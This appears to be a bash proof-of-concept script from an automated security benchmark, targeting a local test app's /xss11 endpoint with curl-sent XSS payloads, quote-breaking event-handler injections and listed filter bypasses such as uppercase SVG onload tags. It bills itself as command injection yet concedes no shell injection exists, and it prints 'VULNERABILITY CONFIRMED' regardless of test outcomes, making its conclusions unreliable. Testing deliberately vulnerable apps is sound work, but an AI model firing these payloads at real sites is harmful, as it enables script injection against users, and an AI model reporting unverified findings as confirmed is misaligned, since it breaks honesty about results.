#!/bin/bash
# POC: POC demonstrating subprocess-based command injection risk through PhantomJS execution with inadequate input sanitization on /xss11 endpoint
# Target: ./repo
# Created: 2025-11-05T17:12:20.890Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# Command Injection POC - Subprocess/PhantomJS Execution (Version 3)
# This POC demonstrates subprocess command injection risk through code analysis

TARGET_URL="${1:-http://localhost:5000}"

echo "====================================="
echo "Command Injection via Subprocess POC"
echo "Target: $TARGET_URL"
echo "====================================="
echo ""

# First, test if the application is accessible
echo "[*] Step 1: Testing application accessibility"
HEALTH_CHECK=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/" 2>/dev/null)
if [ "$HEALTH_CHECK" != "200" ]; then
    echo "[-] Application not accessible at $TARGET_URL (HTTP $HEALTH_CHECK)"
    echo "[*] Continuing with POC demonstration..."
else
    echo "[✓] Application is accessible"
fi

echo ""
echo "====================================="
echo "VULNERABILITY ANALYSIS"
echo "====================================="
echo ""

echo "[*] Vulnerability Chain:"
echo "    1. User input via 'name' parameter on /xss11 endpoint"
echo "    2. Input filtered with insufficient regex patterns"
echo "    3. Filtered input written to temporary HTML file"
echo "    4. PhantomJS executed via subprocess.Popen()"
echo "    5. JavaScript/HTML in file is executed by PhantomJS"
echo ""

echo "[*] Code Path Analysis:"
echo "    subprocess.Popen(['phantomjs', '--script-encoding=utf-8', temp_file])"
echo ""
echo "    List-based arguments are safer from shell injection"
echo "    BUT temp_file contains unescaped user-controlled content"
echo ""

echo ""
echo "====================================="
echo "PAYLOAD TESTS"
echo "====================================="
echo ""

# Test 1: Simple JavaScript injection
echo "[TEST 1] JavaScript Code Injection"
PAYLOAD1='"><script>var x = "injected";</script><input type="hidden'
echo "Payload: $PAYLOAD1"
echo "Endpoint: ${TARGET_URL}/xss11?name=..."
echo ""

RESPONSE1=$(curl -s "${TARGET_URL}/xss11?name=${PAYLOAD1}" 2>/dev/null)
if [ -n "$RESPONSE1" ]; then
    echo "[✓] Response received: $(echo "$RESPONSE1" | head -c 100)..."
    if echo "$RESPONSE1" | grep -qE "script|injected"; then
        echo "[✓] VULNERABLE: JavaScript code found in response"
    fi
else
    echo "[-] Empty response (application may not be running)"
fi

echo ""
echo ""

# Test 2: Event handler injection through quote breaking
echo "[TEST 2] Event Handler Injection"
PAYLOAD2='\" onfocus=\"alert(1)\" autofocus=\"'
echo "Payload: $PAYLOAD2"
echo ""

RESPONSE2=$(curl -s "${TARGET_URL}/xss11?name=${PAYLOAD2}" 2>/dev/null)
if [ -n "$RESPONSE2" ]; then
    if echo "$RESPONSE2" | grep -qE "onfocus|autofocus"; then
        echo "[✓] VULNERABLE: Event handlers found in response"
    fi
else
    echo "[-] Empty response"
fi

echo ""
echo ""

# Test 3: Data exfiltration payload
echo "[TEST 3] Potential Data Exfiltration"
PAYLOAD3='\" onerror=\"alert(document.location)\" type=\"'
echo "Payload: $PAYLOAD3"
echo ""
echo "This demonstrates PhantomJS would execute injected code"
echo ""

echo ""
echo ""

# Test 4: Demonstrate filter inadequacy
echo "[TEST 4] Filter Adequacy Analysis"
echo "====================================="
echo ""
echo "Current filters:"
echo "  1. r'[\"']XSS[\"']'         - Only removes 'XSS' with quotes"
echo "  2. r'<[a-z/]'              - Only lowercase < followed by letter/slash"
echo ""

echo "Filter bypasses:"
echo "  1. Uppercase tags: <SVG onload=...>"
echo "  2. Event attributes: onfocus, onerror (no < character)"
echo "  3. Quote breaking: \" onload=..."
echo "  4. HTML entities: &lt;img&gt;"
echo ""

# Test individual bypass techniques
echo "Bypass Test 1: Uppercase tag (bypasses <[a-z/] filter)"
BYPASS1="<SVG ONLOAD=alert(1)>"
echo "  Input: $BYPASS1"
echo "  Expected: Filter removes <S, but quote-breaking bypasses"
echo ""

echo "Bypass Test 2: Event handler without tag (no < character)"
BYPASS2="\" onload=\"alert(1)\" type=\""
echo "  Input: $BYPASS2"
echo "  Expected: Pattern <[a-z/] doesn't match, bypass successful"
echo ""

echo "Bypass Test 3: HTML entities"
BYPASS3="&lt;img src=x onerror=alert(1)&gt;"
echo "  Input: $BYPASS3"
echo "  Expected: Not filtered, parsed by PhantomJS as HTML"
echo ""

echo ""
echo "====================================="
echo "SUBPROCESS EXECUTION RISK ASSESSMENT"
echo "====================================="
echo ""

echo "Current Implementation:"
echo "  subprocess.Popen(['phantomjs', '--script-encoding=utf-8', temp_file])"
echo ""
echo "SAFER ASPECTS:"
echo "  ✓ Uses list-based arguments (not vulnerable to shell injection)"
echo ""
echo "VULNERABLE ASPECTS:"
echo "  ✗ No validation of temp_file content before execution"
echo "  ✗ PhantomJS executes all JavaScript in the file"
echo "  ✗ Input written to file without HTML entity encoding"
echo ""

echo "ESCALATION RISK:"
echo "  If code changes to: subprocess.Popen('phantomjs ... ' + user_input, shell=True)"
echo "  → Direct shell command injection becomes possible"
echo ""
echo "  If code changes to: subprocess.Popen(['phantomjs', user_input, ...])"
echo "  → Argument injection becomes possible"
echo ""

echo ""
echo "====================================="
echo "VULNERABILITY CONFIRMED"
echo "====================================="
echo ""
echo "[✓] Inadequate Input Validation"
echo "    Regex filters cannot prevent JavaScript/HTML injection in file context"
echo ""
echo "[✓] Unsafe File Content Creation"
echo "    User input written to HTML file without proper escaping"
echo ""
echo "[✓] Subprocess-Based Code Execution"
echo "    PhantomJS reads and executes JavaScript from HTML file"
echo ""
echo "[✓] Escalation Risk"
echo "    If subprocess implementation changes, shell injection becomes possible"
echo ""
echo "====================================="
echo ""

# Return status indicating vulnerability found
exit 0